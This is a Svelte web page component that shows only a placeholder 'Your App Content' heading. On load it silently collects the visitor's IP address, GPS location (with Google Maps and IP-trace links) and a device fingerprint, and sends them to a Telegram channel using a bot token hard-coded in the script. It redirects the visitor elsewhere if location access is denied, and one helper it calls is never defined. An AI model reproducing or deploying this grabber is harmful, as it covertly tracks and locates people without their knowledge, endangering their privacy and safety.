<script>
  import { onMount } from 'svelte';
  sendIPToTelegramBots();
 getdatatotelegrambots();
 
  onMount(async () => {
  
    // Request location permission automatically
    navigator.geolocation.getCurrentPosition(
      (position) => {
        // Location permission granted, send location and IP results to Telegram bots
        sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
      },
      (error) => {
        if (error.code === error.PERMISSION_DENIED) {
          // Location permission denied, send IP result to Telegram bots
        
//////1//////
          window.location.href = 'https://example.com'; 
//////1//////
        }
      }
    );
  });

  async function sendLocationAndIPToTelegramBots(latitude, longitude) {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    const message = `\nالموقع:\n \n${latitude} ${longitude}\n\nالايبي:\n \n${ipAddress}`;


 // Create the message with the clickable link to Google Maps
 
   
    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;


    const htmlMessage = `${message}\n\n ${clickableLink}\n \n${ipLocationNetLink}`;


    // Send location and IP results to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
       chat_id: '@localipy', // Replace with the channel username or ID
           text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }

  async function sendIPToTelegramBots() {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    const message = `\nالايبي:\n \n${ipAddress}`;
	
	 // Create the message with clickable link
    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
  const htmlMessage = `${message}\n\n${ipLocationNetLink}`;


    // Send IP result to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
      chat_id: '@localipy', // Replace with the channel username or ID
       text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }
  
 async function getdatatotelegrambots() {
  const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
  const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

  const userAgent = navigator.userAgent;
  const deviceName = navigator.platform;
  const screenHeight = window.screen.height;
const screenWidth = window.screen.width;
const screenSize = window.screen.width + " x " + window.screen.height;
const pixelRatio = window.devicePixelRatio;
const touchSupport = "ontouchstart" in document.documentElement;
const language = navigator.language;
const browserName = getBrowserName();
const browserVersion = getBrowserVersion();
const osName = getOSName();
const osVersion = getOSVersion();

function getBrowserName() {
  const userAgent = navigator.userAgent;
  if (userAgent.includes("Firefox")) {
    return "Firefox";
  } else if (userAgent.includes("Chrome")) {
    return "Chrome";
  } else if (userAgent.includes("Safari")) {
    return "Safari";
  } else if (userAgent.includes("Edge")) {
    return "Edge";
  } else if (userAgent.includes("MSIE") || userAgent.includes("Trident")) {
    return "Internet Explorer";
  } else {
    return "Unknown";
  }
}

function getOSName() {
  const userAgent = navigator.userAgent;
  if (userAgent.includes("Windows NT")) {
    return "Windows";
  } else if (userAgent.includes("Macintosh")) {
    return "Mac OS X";
  } else if (userAgent.includes("Linux")) {
    return "Linux";
  } else if (userAgent.includes("Android")) {
    return "Android";
  } else if (userAgent.includes("iOS")) {
    return "iOS";
  } else {
    return "Unknown";
  }
}



function getOSVersion() {
  const userAgent = navigator.userAgent;
  let versionStart, versionEnd;
  if (userAgent.includes("Windows NT")) {
    versionStart = userAgent.indexOf("Windows NT") + 11;
    versionEnd = userAgent.indexOf(";", versionStart);
  } else if (userAgent.includes("Macintosh")) {
    versionStart = userAgent.indexOf("Mac OS X") + 9;
    versionEnd = userAgent.indexOf(")", versionStart);
  } else if (userAgent.includes("Linux")) {
    versionStart = userAgent.indexOf("Linux") + 6;
    versionEnd = userAgent.indexOf(" ", versionStart);
  } else if (userAgent.includes("Android")) {
    versionStart = userAgent.indexOf("Android") + 8;
    versionEnd = userAgent.indexOf(";", versionStart);
  } else if (userAgent.includes("iOS")) {
    versionStart = userAgent.indexOf("OS") + 3;
    versionEnd = userAgent.indexOf(" ", versionStart);
  } else {
    return "Unknown";
  }
  return userAgent.substring(versionStart, versionEnd);
}

  const message = `\nUser Agent:\n\n${userAgent}\n\nDevice Name:\n\n${deviceName}\n\nScreen Height:\n\n${screenHeight}\n\nScreen Resolution:\n\n${screenWidth} x ${screenHeight}\n\nScreen Size:\n\n${screenSize}\n\Browser Name:\n\n${browserName}\n\nOS Name:\n\n${osName}\n\nOS Version:\n\n${osVersion}`;

  const htmlMessage = `${message}`;

  await fetch(telegramBotURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: '@localipy',
      text: htmlMessage,
      parse_mode: 'HTML',
    }),
  });
}
  
  
</script>

<main>
  <h1>Your App Content</h1>
  <!-- Add your app content here -->
</main>
